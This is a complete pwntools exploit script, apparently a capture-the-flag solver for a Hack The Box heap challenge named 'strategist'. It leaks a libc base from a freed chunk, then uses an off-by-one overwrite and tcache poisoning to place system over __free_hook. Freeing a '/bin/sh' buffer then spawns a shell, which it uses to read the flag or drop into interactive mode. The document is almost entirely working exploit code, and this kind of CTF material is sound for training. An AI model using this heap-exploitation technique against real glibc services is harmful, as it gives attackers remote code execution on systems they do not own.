#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h']

fname = './strategist' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e    = ELF(fname, checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

rl  = lambda     : r.recvline()
ru  = lambda x   : r.recvuntil(x)
sa  = lambda x,y : r.sendafter(x,y)
sla = lambda x,y : r.sendlineafter(x,y)

def get_flag():
  pause(1)
  r.sendline('cat flag* &2>/dev/null')
  flag = r.recvline_contains(b"HTB", timeout=0.2).strip().decode()
  if len(flag) == 0:
    print('\n~~ Shell ~~\n')
    r.interactive()
  else:
    print(f'\nFlag --> {flag}\n')

def create(size, data):
  sla('> ', '1')
  sla('> ', str(size))
  sa('> ', data)

def show(idx):
  sla('> ', '2')
  sla('> ', str(idx))
  r.recvuntil('Plan [0]: ')
  return u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x36b1d7 - libc.sym.puts

def edit(idx, data):
  sla('> ', '3')
  sla('> ', str(idx))
  sa('> ', data)

def delete(idx):
  sla('> ', '4')
  sla('> ', str(idx))

# Leak a libc address
create(0x420, 'w')
create(0x100, 'w')
delete(0)
delete(1)
create(0x420, 'w')

libc.address = show(0)
print(f'[*] Libc base: {libc.address:#04x}')

# Overwrite __free_hook with system
delete(0)
create(0x48, 'w'*0x48)
create(0x48, '3'*0x48)
create(0x48, 't'*0x48)

edit(0, b'w'*0x48 + p8(0x80))
delete(1)
delete(2)
create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook))
create(0x40, b'/bin/sh\x00')
create(0x40, p64(libc.sym.system))
delete(2)

# Read flag or get shell
get_flag()